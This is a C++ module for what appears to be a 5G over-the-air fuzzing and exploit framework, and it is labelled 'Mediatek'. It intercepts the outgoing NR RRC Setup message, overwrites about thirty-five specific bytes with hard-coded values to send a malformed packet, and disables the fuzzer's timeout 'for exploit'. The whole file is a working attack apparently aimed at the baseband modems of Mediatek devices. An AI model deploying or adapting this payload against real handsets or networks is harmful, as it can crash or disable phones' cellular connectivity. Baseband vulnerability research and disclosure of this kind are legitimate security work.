#include <ModulesInclude.hpp>
// Filters
wd_filter_t f1;
// Vars
const char *module_name()
{
    return "Mediatek";
}
// Setup
int setup(wd_modules_ctx_t *ctx)
{
    // Change required configuration for exploit
    ctx->config->fuzzing.global_timeout = false;
    // Declare filters
    f1 = wd_filter("nr-rrc.rrcSetup_element");
    return 0;
}
// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    // Register filters
    wd_register_filter(ctx->wd, f1);
    return 0;
}
int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, wd_modules_ctx_t *ctx)
{
    if (wd_read_filter(ctx->wd, f1)) {
        wd_log_y("Malformed rrc setup sent!");
        pkt_buf[74 - 48] = 0x9a;
        pkt_buf[701 - 48] = 0x0d;
        pkt_buf[702 - 48] = 0xc4;
        pkt_buf[703 - 48] = 0x08;
        pkt_buf[704 - 48] = 0xe3;
        pkt_buf[705 - 48] = 0x1f;
        pkt_buf[706 - 48] = 0x81;
        pkt_buf[707 - 48] = 0xa2;
        pkt_buf[708 - 48] = 0x00;
        pkt_buf[709 - 48] = 0x30;
        pkt_buf[710 - 48] = 0x11;
        pkt_buf[711 - 48] = 0x01;
        pkt_buf[712 - 48] = 0x02;
        pkt_buf[713 - 48] = 0x05;
        pkt_buf[714 - 48] = 0x4c;
        pkt_buf[715 - 48] = 0x16;
        pkt_buf[716 - 48] = 0x83;
        pkt_buf[717 - 48] = 0x06;
        pkt_buf[718 - 48] = 0x34;
        pkt_buf[719 - 48] = 0x80;
        pkt_buf[720 - 48] = 0x71;
        pkt_buf[721 - 48] = 0x82;
        pkt_buf[722 - 48] = 0x38;
        pkt_buf[723 - 48] = 0xc7;
        pkt_buf[724 - 48] = 0xe0;
        pkt_buf[725 - 48] = 0x68;
        pkt_buf[726 - 48] = 0x80;
        pkt_buf[727 - 48] = 0x0d;
        pkt_buf[728 - 48] = 0x06;
        pkt_buf[729 - 48] = 0x40;
        pkt_buf[730 - 48] = 0x40;
        pkt_buf[731 - 48] = 0xc1;
        pkt_buf[732 - 48] = 0x53;
        pkt_buf[733 - 48] = 0x00;
        pkt_buf[734 - 48] = 0x3f;
        pkt_buf[735 - 48] = 0x00;
        return 1;
    }
    return 0;
}
